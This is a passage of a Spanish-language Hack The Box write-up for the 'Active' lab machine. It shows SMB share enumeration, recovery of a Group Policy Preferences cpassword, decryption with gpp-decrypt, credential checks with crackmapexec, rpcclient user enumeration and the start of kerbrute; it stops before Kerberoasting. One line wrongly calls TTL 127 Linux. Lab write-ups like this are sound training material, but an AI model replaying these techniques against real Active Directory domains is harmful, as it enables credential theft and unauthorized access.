---
layout: single
title: <span style="color:#9FEF00">Active </span><span class="htb">-</span><span class="htb"> Hack The Box </span><span class="htb">-</span><span class="htb">ESP</span>
excerpt: "En este post realizaremos el write up de la máquina Active. Tocaremos los conceptos de enumeración de SMB, Abuso de contraseñas GPP, Descifrando Contraseñas GPP - gpp-decrypt, Ataque Kerberoasting GetUserSPNs.py -Escalada de Privilegios. Es una máquina facil."
date: 2023-08-16
classes: wide
header:
  teaser: /assets/images/Active/LogoActive.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.png
categories:
  - Hack The Box
  - Windows 
  - OSCP
  - OSEP
  - Easy
tags:  
  - SMB Enumeration
  - Abusing GPP Passwords   
  - Decrypting GPP Passwords - gpp-decrypt    
  - Kerberoasting Attack (GetUserSPNs.py) [Privilege Escalation]
---
<h3 style="text-align:center">DESCRIPCIÓN</h3><hr>
En este post realizaremos el write up de la máquina Active. Tocaremos los conceptos de enumeración de SMB, Abuso de contraseñas GPP, Descifrando Contraseñas GPP - gpp-decrypt, Ataque Kerberoasting GetUserSPNs.py, escalada de Privilegios. Es una máquina facil.

![](../assets/images/Active/ActiveLogo.png)

<h3 style="text-align:center">INDICE</h3><hr>

- [Reconocimiento](#fase-de-reconocimiento)
    - [Enumeración de puertos](#enumeracion-de-puertos)
    - [Enumeración de servicios](#enumeracion-de-servicios)
- [Explotación](#explotacion)
    - [Abuso de contraseñas GPP](#abusodecontrasenas)
- [Escalada de privilegios](#escalada-de-privilegios)
- [Autores y referencias](#autores-y-referencias)


<h3 style="text-align:center" id="fase-de-reconocimiento">RECONOCIMIENTO</h3><hr>


- El objetivo principal de la etapa de reconocimiento es obtener una visión general de la infraestructura, sistemas, aplicaciones y posibles puntos débiles de la organización o sistema que se va a someter a la prueba de penetración. Esta información es esencial para planificar y ejecutar el resto del proceso de pentesting de manera más efectiva.

- Durante la etapa de reconocimiento, el equipo de pentesting puede realizar diferentes acciones y técnicas, que incluyen:

1.`Búsqueda de información pública:` Se recopila información de dominios, subdominios, direcciones IP, registros de DNS, información de contacto de la empresa, etc., que está disponible públicamente a través de fuentes como el sitio web de la empresa, registros WHOIS, redes sociales, motores de búsqueda, entre otros.

2.`Escaneo de red:` Se utilizan herramientas de escaneo de puertos y servicios para identificar los sistemas en línea y los puertos abiertos en el objetivo. Esto ayuda a tener una idea de la infraestructura de red y los servicios disponibles.

3.`Enumeración de servicios:` Una vez identificados los servicios y puertos abiertos, se intenta obtener información más detallada sobre los servicios, como las versiones de software, para determinar si existen vulnerabilidades conocidas asociadas con esos servicios.

4.`Búsqueda de subdominios y directorios ocultos:` Se busca información adicional sobre posibles subdominios, directorios ocultos o páginas web no enlazadas públicamente, lo que podría revelar puntos de entrada adicionales o información sensible.

5.`Análisis de arquitectura de red:` Se investiga la topología de la red para comprender la relación entre diferentes sistemas y cómo se conectan, lo que ayuda a identificar posibles rutas para movimientos laterales.

6.`Búsqueda de vulnerabilidades conocidas:` Se investigan bases de datos de vulnerabilidades conocidas y bases de datos de exploits para identificar posibles vulnerabilidades que puedan existir en el software o servicios utilizados por el objetivo.

- Lo primero que vamos hacer es un ping a la maquina victima ping -c 1 10.10.10.100 ping: Es el comando utilizado para enviar solicitudes de eco (ping) a una dirección IP específica para verificar la conectividad de red y la latencia de la conexión. -c 1: Es una opción que se utiliza para especificar el número de solicitudes de eco que se enviarán. En este caso, se envía solo una solicitud (-c 1). 10.10.10.100: Es la dirección IP del host o máquina que será objeto del comando ping.

```ruby
❯ ping -c 1 10.10.10.100
PING 10.10.10.100 (10.10.10.100) 56(84) bytes of data.
64 bytes from 10.10.10.100: icmp_seq=1 ttl=127 time=83.0 ms

--- 10.10.10.100 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 83.022/83.022/83.022/0.000 ms
```
El TTL-->127 indica que es una máquina Linux

Con whichSytem.py nos arroja ante que nos estamos enfrentando con solo poner la dirección ip.
```ruby
❯ whichSystem.py 10.10.10.100

10.10.10.100 (ttl -> 127): Windows

```

Si quieren esa utilidad la guardan en el /usr/bin
```python
#!/usr/bin/python3
#coding: utf-8
 
import re, sys, subprocess
 
# python3 wichSystem.py 10.10.10.188 
 
if len(sys.argv) != 2:
    print("\n[!] Uso: python3 " + sys.argv[0] + " <direccion-ip>\n")
    sys.exit(1)
 
def get_ttl(ip_address):
 
    proc = subprocess.Popen(["/usr/bin/ping -c 1 %s" % ip_address, ""], stdout=subprocess.PIPE, shell=True)
    (out,err) = proc.communicate()
 
    out = out.split()
    out = out[12].decode('utf-8')
 
    ttl_value = re.findall(r"\d{1,3}", out)[0]
 
    return ttl_value
 
def get_os(ttl):
 
    ttl = int(ttl)
 
    if ttl >= 0 and ttl <= 64:
        return "Linux"
    elif ttl >= 65 and ttl <= 128:
        return "Windows"
    else:
        return "Not Found"
 
if __name__ == '__main__':
 
    ip_address = sys.argv[1]
 
    ttl = get_ttl(ip_address)
  
     os_name = get_os(ttl)
     print("\n%s (ttl -> %s): %s\n" % (ip_address, ttl, os_name))
```

<h3 style="text-align:center" id="enumeracion-de-puertos">ENUMERACIÓN DE PUERTOS</h3><hr>

Realizamos un escaneo de puertos usando la herramienta `nmap`:

`nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.100 -oG scanPorts`

Veamos el significado de cada opción utilizada en el comando:

- `nmap`: Es el comando para ejecutar la herramienta de escaneo de puertos `nmap`.
    
- `-p-`: Esta opción indica que se deben escanear todos los puertos, es decir, desde el puerto 1 hasta el puerto 65535.
    
- `--open`: Filtra los resultados del escaneo para mostrar solo los puertos que están abiertos, es decir, aquellos que responden a la solicitud de escaneo.
    
- `-sS`: Indica un escaneo de tipo “SYN scan”. Este tipo de escaneo envía paquetes SYN (sincronización) a los puertos y analiza las respuestas para determinar si están abiertos, cerrados o filtrados por firewall.
    
- `--min-rate 5000`: Establece la velocidad mínima de envío de paquetes. En este caso, se envían al menos 5000 paquetes por segundo.
    
- `-vvv`: Habilita el modo de salida muy detallado, lo que significa que se mostrarán niveles de verbosidad muy altos para obtener información detallada del escaneo.
    
- `-n`: Indica que no se realice la resolución de DNS para las direcciones IP, lo que acelera el escaneo.
    
- `-Pn`: Esta opción indica que no se realice el “ping” para determinar si los hosts están en línea o no. Se ignoran las respuestas del ping y se escanea directamente.
    
- `10.10.10.100`: Es la dirección IP del objetivo que será escaneado.
    
- `-oG scanPorts`: Especifica que se debe guardar la salida del escaneo en un formato “grepable” (formato de texto plano) con el nombre de archivo “scanPorts”.

```ruby
❯ ❯ nmap -p- --open -sS -min-rate 5000 -vvv -n -Pn 10.10.10.100 -oG scanPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-29 22:55 -05
Initiating SYN Stealth Scan at 22:55
Scanning 10.10.10.100 [65535 ports]
Discovered open port 53/tcp on 10.10.10.100
Discovered open port 135/tcp on 10.10.10.100
Discovered open port 445/tcp on 10.10.10.100
Discovered open port 139/tcp on 10.10.10.100
Discovered open port 3268/tcp on 10.10.10.100
Discovered open port 49153/tcp on 10.10.10.100
Discovered open port 47001/tcp on 10.10.10.100
Discovered open port 88/tcp on 10.10.10.100
Discovered open port 464/tcp on 10.10.10.100
Discovered open port 49158/tcp on 10.10.10.100
Discovered open port 9389/tcp on 10.10.10.100
Discovered open port 389/tcp on 10.10.10.100
Discovered open port 49155/tcp on 10.10.10.100
Discovered open port 49157/tcp on 10.10.10.100
Discovered open port 5722/tcp on 10.10.10.100
Discovered open port 49165/tcp on 10.10.10.100
Discovered open port 593/tcp on 10.10.10.100
Discovered open port 49168/tcp on 10.10.10.100
Discovered open port 49152/tcp on 10.10.10.100
Discovered open port 636/tcp on 10.10.10.100
Discovered open port 49154/tcp on 10.10.10.100
Discovered open port 3269/tcp on 10.10.10.100
Discovered open port 49166/tcp on 10.10.10.100
Completed SYN Stealth Scan at 22:55, 13.85s elapsed (65535 total ports)
Nmap scan report for 10.10.10.100
Host is up, received user-set (0.087s latency).
Scanned at 2023-07-29 22:55:29 -05 for 14s
Not shown: 65509 closed tcp ports (reset), 3 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE          REASON
53/tcp    open  domain           syn-ack ttl 127
88/tcp    open  kerberos-sec     syn-ack ttl 127
135/tcp   open  msrpc            syn-ack ttl 127
139/tcp   open  netbios-ssn      syn-ack ttl 127
389/tcp   open  ldap             syn-ack ttl 127
445/tcp   open  microsoft-ds     syn-ack ttl 127
464/tcp   open  kpasswd5         syn-ack ttl 127
593/tcp   open  http-rpc-epmap   syn-ack ttl 127
636/tcp   open  ldapssl          syn-ack ttl 127
3268/tcp  open  globalcatLDAP    syn-ack ttl 127
3269/tcp  open  globalcatLDAPssl syn-ack ttl 127
5722/tcp  open  msdfsr           syn-ack ttl 127
9389/tcp  open  adws             syn-ack ttl 127
47001/tcp open  winrm            syn-ack ttl 127
49152/tcp open  unknown          syn-ack ttl 127
49153/tcp open  unknown          syn-ack ttl 127
49154/tcp open  unknown          syn-ack ttl 127
49155/tcp open  unknown          syn-ack ttl 127
49157/tcp open  unknown          syn-ack ttl 127
49158/tcp open  unknown          syn-ack ttl 127
49165/tcp open  unknown          syn-ack ttl 127
49166/tcp open  unknown          syn-ack ttl 127
49168/tcp open  unknown          syn-ack ttl 127

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 13.93 seconds
           Raw packets sent: 68791 (3.027MB) | Rcvd: 65637 (2.626MB)
```

Escaneamos al objetivo con los scripts básicos de reconocimiento de nmap, apuntando a los puertos abiertos en busca de más información. Los resultados incluirán información sobre los servicios que se están ejecutando en los puertos escaneados y sus versiones correspondientes.

`nmap -sCV -p21,80 10.10.10.100 -oN targeted`

```ruby
# Nmap 7.93 scan initiated Sat Jul 29 19:01:42 2023 as: nmap -sC -sV -p53,88,135,139,389,445,464,593,636,3268,3269,5722,9389,47001,49152,49153,49154,49155,
166,49168 -oN targeted 10.10.10.100
Nmap scan report for 10.10.10.100
Host is up (0.087s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
| dns-nsid: 
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-07-30 00:01:45Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  tcpwrapped
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5722/tcp  open  msrpc         Microsoft Windows RPC
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49152/tcp open  msrpc         Microsoft Windows RPC
49153/tcp open  msrpc         Microsoft Windows RPC
49154/tcp open  msrpc         Microsoft Windows RPC
49155/tcp open  msrpc         Microsoft Windows RPC
49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49158/tcp open  msrpc         Microsoft Windows RPC
49165/tcp open  msrpc         Microsoft Windows RPC
49166/tcp open  msrpc         Microsoft Windows RPC
49168/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   210: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2023-07-30T00:02:46
|_  start_date: 2023-07-28T06:42:11
|_clock-skew: -2s
 
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 # Nmap done at Sat Jul 29 19:02:54 2023 -- 1 IP address (1 host up) scanned in 72.02 seconds

```

1. Puerto 445/tcp: El puerto 445 está asociado con el protocolo de Compartición de Archivos de Microsoft (SMB - Server Message Block), que es utilizado para compartir archivos, impresoras y otros recursos en una red local. Es comúnmente utilizado en sistemas Windows.
2. Puerto 88/tcp: El puerto 88 está asociado comúnmente con el servicio Kerberos. Kerberos es un protocolo de autenticación de red que se utiliza para permitir que los usuarios y servicios autentiquen mutuamente su identidad en una red y, posteriormente, se establezca una comunicación segura entre ellos.


<h3 style="text-align:center" id="enumeracion-de-servicios">ENUMERACIÓN DE SERVICIOS</h3><hr>

- Usando crackmapexec podemos ejecutarla con el protocolo SMB(Server Message Block) para intentar enumerar recursos compartidos (comparticiones de archivos y carpetas), usuarios y grupos en el sistema con la dirección IP "10.10.10.100".

```ruby
❯ crackmapexec smb 10.10.10.100
SMB         10.10.10.100    445    DC               [*] Windows 6.1 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False)

```

- Vemos un dominio active.htb y lo ingresamos al /etc/host para que nos resuelva.
- Otra cosa  que podemos hacer es usa la herramienta `smbclient`.

```ruby 
❯ smbclient -L 10.10.10.100 -N
Anonymous login successful

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	NETLOGON        Disk      Logon server share 
	Replication     Disk      
	SYSVOL          Disk      Logon server share 
	Users           Disk      
SMB1 disabled -- no workgroup available
```

`Anonymous login successful`: Esto indica que la conexión a los recursos compartidos se realizó de manera anónima, es decir, sin proporcionar credenciales de usuario.

- Encontramos recursos interesantes como NETLOGON, Replication, SYSVOL,Users 
- Con `smbmap`  enumeramos los recursos compartidos disponibles en un sistema con la dirección IP "10.10.10.100" a través del protocolo SMB (Server Message Block). La herramienta `smbmap` es otra utilidad que permite explorar y enumerar los recursos compartidos en sistemas Windows y Samba en entornos de red local. 

```ruby
❯ smbmap -H 10.10.10.100
[+] IP: 10.10.10.100:445	Name: active.htb                                        
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                            	NO ACCESS	Remote Admin
	C$                                                	NO ACCESS	Default share
	IPC$                                              	NO ACCESS	Remote IPC
	NETLOGON                                          	NO ACCESS	Logon server share 
	Replication                                       	READ ONLY	
	SYSVOL                                            	NO ACCESS	Logon server share 
	Users                                             	NO ACCESS	
```

- Vemos que el  recurso Replication tenemos permisos de lectura, entonces buscamos ver lo que tiene.

```ruby
❯ smbmap -H 10.10.10.100 -r Replication
[+] IP: 10.10.10.100:445	Name: active.htb                                        
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	Replication                                       	READ ONLY	
	.\Replication\*
	dr--r--r--                0 Sat Jul 21 05:37:44 2018	.
	dr--r--r--                0 Sat Jul 21 05:37:44 2018	..
	dr--r--r--                0 Sat Jul 21 05:37:44 2018	active.htb

```
- Vemos un active.htb entonces veamos lo que tiene:

```ruby
❯ smbmap -H 10.10.10.100 -r Replication/active.htb
[+] IP: 10.10.10.100:445	Name: active.htb                                        
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	Replication                                       	READ ONLY	
	.\Replicationactive.htb\*
	dr--r--r--                0 Sat Jul 21 05:37:44 2018	.
	dr--r--r--                0 Sat Jul 21 05:37:44 2018	..
	dr--r--r--                0 Sat Jul 21 05:37:44 2018	DfsrPrivate
	dr--r--r--                0 Sat Jul 21 05:37:44 2018	Policies
	dr--r--r--                0 Sat Jul 21 05:37:44 2018	scripts
```

- Esta estructura pertenece a una carpeta especial llamada SYSVOL, que es una carpeta especial en los controladores de dominio de Windows que juega un papel importante en la replicación de datos y políticas de grupo dentro de un entorno de dominio de Active Directory. La carpeta SYSVOL contiene información crítica para el correcto funcionamiento de un dominio de Windows y su contenido es replicado automáticamente entre todos los controladores de dominio en el dominio, esta carpeta puede ser una copia de SYSVOL.

```ruby
❯ sudo smbmap -H 10.10.10.100 -r Replication/active.htb/Policies
[+] IP: 10.10.10.100:445	Name: active.htb                                        
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	Replication                                       	READ ONLY	
	.\Replicationactive.htb\Policies\*
	dr--r--r--                0 Sat Jul 21 05:37:44 2018	.
	dr--r--r--                0 Sat Jul 21 05:37:44 2018	..
	dr--r--r--                0 Sat Jul 21 05:37:44 2018	{31B2F340-016D-11D2-945F-00C04FB984F9}
	dr--r--r--                0 Sat Jul 21 05:37:44 2018	{6AC1786C-016F-11D2-945F-00C04fB984F9}
```

```ruby
❯ smbmap -H 10.10.10.100 -r Replication/active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/
[+] IP: 10.10.10.100:445	Name: active.htb                                        
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	Replication                                       	READ ONLY	
	.\Replicationactive.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\*
	dr--r--r--                0 Sat Jul 21 05:37:44 2018	.
	dr--r--r--                0 Sat Jul 21 05:37:44 2018	..
	fr--r--r--               23 Sat Jul 21 05:38:11 2018	GPT.INI
	dr--r--r--                0 Sat Jul 21 05:37:44 2018	Group Policy
	dr--r--r--                0 Sat Jul 21 05:37:44 2018	MACHINE
	dr--r--r--                0 Sat Jul 21 05:37:44 2018	USER
❯ smbmap -H 10.10.10.100 -r Replication/active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE
[+] IP: 10.10.10.100:445	Name: active.htb                                        
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	Replication                                       	READ ONLY	
	.\Replicationactive.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\*
	dr--r--r--                0 Sat Jul 21 05:37:44 2018	.
	dr--r--r--                0 Sat Jul 21 05:37:44 2018	..
	dr--r--r--                0 Sat Jul 21 05:37:44 2018	Microsoft
	dr--r--r--                0 Sat Jul 21 05:37:44 2018	Preferences
	fr--r--r--             2788 Sat Jul 21 05:38:11 2018	Registry.pol
❯ smbmap -H 10.10.10.100 -r Replication/active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/
[+] IP: 10.10.10.100:445	Name: active.htb                                        
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	Replication                                       	READ ONLY	
	.\Replicationactive.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\*
	dr--r--r--                0 Sat Jul 21 05:37:44 2018	.
	dr--r--r--                0 Sat Jul 21 05:37:44 2018	..
	dr--r--r--                0 Sat Jul 21 05:37:44 2018	Groups
❯ smbmap -H 10.10.10.100 -r Replication/active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups
[+] IP: 10.10.10.100:445	Name: active.htb                                        
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	Replication                                       	READ ONLY	
	.\Replicationactive.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\*
	dr--r--r--                0 Sat Jul 21 05:37:44 2018	.
	dr--r--r--                0 Sat Jul 21 05:37:44 2018	..
	fr--r--r--              533 Sat Jul 21 05:38:11 2018	Groups.xml
```

<h3 style="text-align:center" id="explotacion">EXPLOTACIÓN</h3><hr>

En esta etapa, el objetivo principal es simular un ataque real y probar la capacidad del sistema para resistir a posibles ataques y explotaciones.

<h3 style="text-align:center" id="abusodecontrasenas">ABUSO DE CONTRASEÑA GPP</h3><hr>
 
- Nos descargamos el recurso:

```ruby
❯ smbmap -H 10.10.10.100 --download Replication/active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups/Groups.xml
[+] Starting download: Replication\active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\Groups.xml (533 bytes)
[+] File output to: /home/balthael/Desktop/Hack/HTB/Active/nmap/10.10.10.100-Replication_active.htb_Policies_{31B2F340-016D-11D2-945F-00C04FB984F9}_MACHINE_Preferences_Groups_Groups.xml

```

- Este es el contenido del archivo:

```ruby
<?xml version="1.0" encoding="utf-8"?>
<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}"><User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="active.htb\SVC_TGS" image="2" changed="2018-07-18 20:46:06" u
id="{EF57DA28-5F69-4530-A59E-AAB58578219D}"><Properties action="U" newName="" fullName="" description="" cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3x
UjTLfCuNH8pG5aSVYdYw/NglVmQ" changeLogon="0" noChange="1" neverExpires="1" acctDisabled="0" userName="active.htb\SVC_TGS"/></User>
</Groups>
```

- Tenemos un UserName y una contraseña que esta encriptada.

``User: SVC_TGS``
``password: edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ``

- Con la utilidad `gpp-decrypy` podemos ver en texto claro la contraseña

```ruby
❯ gpp-decrypt 'edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ'
GPPstillStandingStrong2k18

```

- La contraseña para el usuario SVC_TGS es:  GPPstillStandingStrong2k18

 - Con crackmapexec podemos validar si tenemos acceso con estas credenciales, si nos da un [+] como respuesta es porque podemos loguearnos. 

```ruby
❯ crackmapexec smb 10.10.10.100 -u 'SVC_TGS' -p 'GPPstillStandingStrong2k18'
SMB         10.10.10.100    445    DC               [*] Windows 6.1 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False)
SMB         10.10.10.100    445    DC               [+] active.htb\SVC_TGS:GPPstillStandingStrong2k18 

```

- Si agregamos el parametro --shares podemos ver los recursos compartidos a nivel de red existentes para ver con cual nos podemos autenticar.

```ruby
❯ crackmapexec smb 10.10.10.100 -u 'SVC_TGS' -p 'GPPstillStandingStrong2k18' --shares
SMB         10.10.10.100    445    DC               [*] Windows 6.1 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False)
SMB         10.10.10.100    445    DC               [+] active.htb\SVC_TGS:GPPstillStandingStrong2k18 
SMB         10.10.10.100    445    DC               [*] Enumerated shares
SMB         10.10.10.100    445    DC               Share           Permissions     Remark
SMB         10.10.10.100    445    DC               -----           -----------     ------
SMB         10.10.10.100    445    DC               ADMIN$                          Remote Admin
SMB         10.10.10.100    445    DC               C$                              Default share
SMB         10.10.10.100    445    DC               IPC$                            Remote IPC
SMB         10.10.10.100    445    DC               NETLOGON        READ            Logon server share 
SMB         10.10.10.100    445    DC               Replication     READ            
SMB         10.10.10.100    445    DC               SYSVOL          READ            Logon server share 
SMB         10.10.10.100    445    DC               Users           READ            

```

- Tenemos recursos que podemos enumerar, en este caso vamos a empezar con Users, esto lo podemos hacer con `smbmap`

```ruby
❯ smbmap -H 10.10.10.100 -u 'SVC_TGS' -p 'GPPstillStandingStrong2k18' -r Users
[+] IP: 10.10.10.100:445	Name: active.htb                                        
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	Users                                             	READ ONLY	
	.\Users\*
	dw--w--w--                0 Sat Jul 21 09:39:20 2018	.
	dw--w--w--                0 Sat Jul 21 09:39:20 2018	..
	dr--r--r--                0 Mon Jul 16 05:14:21 2018	Administrator
	dr--r--r--                0 Mon Jul 16 16:08:56 2018	All Users
	dw--w--w--                0 Mon Jul 16 16:08:47 2018	Default
	dr--r--r--                0 Mon Jul 16 16:08:56 2018	Default User
	fr--r--r--              174 Mon Jul 16 16:01:17 2018	desktop.ini
	dw--w--w--                0 Mon Jul 16 16:08:47 2018	Public
	dr--r--r--                0 Sat Jul 21 10:16:32 2018	SVC_TGS
```

- Vemos que existe los recursos para Administrator y para el Usuario SVC_TGS vamos a entrar al del usuario SVC_TGS e intentar ver la flag

```ruby
❯ smbmap -H 10.10.10.100 -u 'SVC_TGS' -p 'GPPstillStandingStrong2k18' -r Users/SVC_TGS/Desktop/
[+] IP: 10.10.10.100:445	Name: active.htb                                        
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	Users                                             	READ ONLY	
	.\UsersSVC_TGS\Desktop\*
	dr--r--r--                0 Sat Jul 21 10:14:42 2018	.
	dr--r--r--                0 Sat Jul 21 10:14:42 2018	..
	fw--w--w--               34 Sun Jul 30 19:04:45 2023	user.txt
```

- No la descargamos y la vemos, esto indica que hemos comprometido la maquina pero ahora nos falta elevar nuestros privilegios:
```ruby
❯ smbmap -H 10.10.10.100 -u 'SVC_TGS' -p 'GPPstillStandingStrong2k18' --download Users/SVC_TGS/Desktop/user.txt
[+] Starting download: Users\SVC_TGS\Desktop\user.txt (34 bytes)
[+] File output to: /home/balthael/Desktop/Hack/HTB/Active/content/10.10.10.100-Users_SVC_TGS_Desktop_user.txt
****
```

- Esta es la flag del Usuario :

```ruby
❯ cat user.txt
───────┬────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: user.txt
───────┼────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ 84cf1085df8f354bdadb81291f0c9028
───────┴────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────

```

<h3 style="text-align:center" id="escalada-de-privilegios">ESCALADA DE PRIVILEGIOS</h3><hr>

- Con `rpcclient` podemos conectarnos a la maquina victima

```ruby
❯ rpcclient -U "SVC_TGS%GPPstillStandingStrong2k18" 10.10.10.100
rpcclient $> 
``` 
- Enumeramos los usuarios existentes:

```ruby
❯ rpcclient -U "SVC_TGS%GPPstillStandingStrong2k18" 10.10.10.100
rpcclient $> enumdomusers
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[SVC_TGS] rid:[0x44f]
rpcclient $> 
```
- Enumeramos grupos existentes

```ruby
❯ rpcclient -U "SVC_TGS%GPPstillStandingStrong2k18" 10.10.10.100 -c 'enumdomgroups'
group:[Enterprise Read-only Domain Controllers] rid:[0x1f2]
group:[Domain Admins] rid:[0x200]
group:[Domain Users] rid:[0x201]
group:[Domain Guests] rid:[0x202]
group:[Domain Computers] rid:[0x203]
group:[Domain Controllers] rid:[0x204]
group:[Schema Admins] rid:[0x206]
group:[Enterprise Admins] rid:[0x207]
group:[Group Policy Creator Owners] rid:[0x208]
group:[Read-only Domain Controllers] rid:[0x209]
group:[DnsUpdateProxy] rid:[0x44e]
```
- Aquí nos interesa enumerar los usuarios que hagan parte del grupo Admins, que estos usuarios tiene privilegios máximos y podemos aprovecharnos de uno.

```ruby
❯ rpcclient -U "SVC_TGS%GPPstillStandingStrong2k18" 10.10.10.100 -c 'querygroupmem 0x200'
	rid:[0x1f4] attr:[0x7]
```
- Con el rid podemos podemos enumerar ese usuario:

```ruby
❯ rpcclient -U "SVC_TGS%GPPstillStandingStrong2k18" 10.10.10.100 -c 'queryuser 0x1f4'
	User Name   :	Administrator
	Full Name   :	
	Home Drive  :	
	Dir Drive   :	
	Profile Path:	
	Logon Script:	
	Description :	Built-in account for administering the computer/domain
	Workstations:	
	Comment     :	
	Remote Dial :
	Logon Time               :	dom, 30 jul 2023 19:04:52 -05
	Logoff Time              :	mié, 31 dic 1969 19:00:00 -05
	Kickoff Time             :	mié, 31 dic 1969 19:00:00 -05
	Password last set Time   :	mié, 18 jul 2018 14:06:40 -05
	Password can change Time :	jue, 19 jul 2018 14:06:40 -05
	Password must change Time:	mié, 13 sep 30828 21:48:05 -05
	unknown_2[0..31]...
	user_rid :	0x1f4
	group_rid:	0x201
	acb_info :	0x00000210
	fields_present:	0x00ffffff
	logon_divs:	168
	bad_password_count:	0x00000000
	logon_count:	0x00000041
	padding1[0..7]...
	logon_hrs[0..21]...
```
- Para enumerar las descripciones de los usuarios estos nos sirve para identificar el tipo de usuario que existe en el directorio activo, para ello  hacemos lo siguiente:

```ruby
❯ rpcclient -U "SVC_TGS%GPPstillStandingStrong2k18" 10.10.10.100 -c 'querydispinfo'
index: 0xdea RID: 0x1f4 acb: 0x00000210 Account: Administrator	Name: (null)	Desc: Built-in account for administering the computer/domain
index: 0xdeb RID: 0x1f5 acb: 0x00000215 Account: Guest	Name: (null)	Desc: Built-in account for guest access to the computer/domain
index: 0xe19 RID: 0x1f6 acb: 0x00020011 Account: krbtgt	Name: (null)	Desc: Key Distribution Center Service Account
index: 0xeb2 RID: 0x44f acb: 0x00000210 Account: SVC_TGS	Name: SVC_TGS	Desc: (null)
```
- Siempre es aconsejable sincronizar la hora de la máquina victima con la hora de la máquina atacante, para ello usamos la herramienta `ntpdate` 

```ruby
❯ ntpdate 10.10.10.100
30 Jul 21:30:42 ntpdate[551428]: adjust time server 10.10.10.100 offset -0.175191 sec
```
-  Como tenemos el puerto 88 abierto y corre un Kerberos podemos usar la herramienta `kerbrute` para enumerar usuarios validos a través de fuerza bruta 

```ruby
❯ kerbrute userenum --dc 10.10.10.100 -d active.htb /usr/share/seclists/Usernames/Names/names.txt

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 07/30/23 - Ronnie Flathers @ropnop

2023/07/30 21:31:59 >  Using KDC(s):
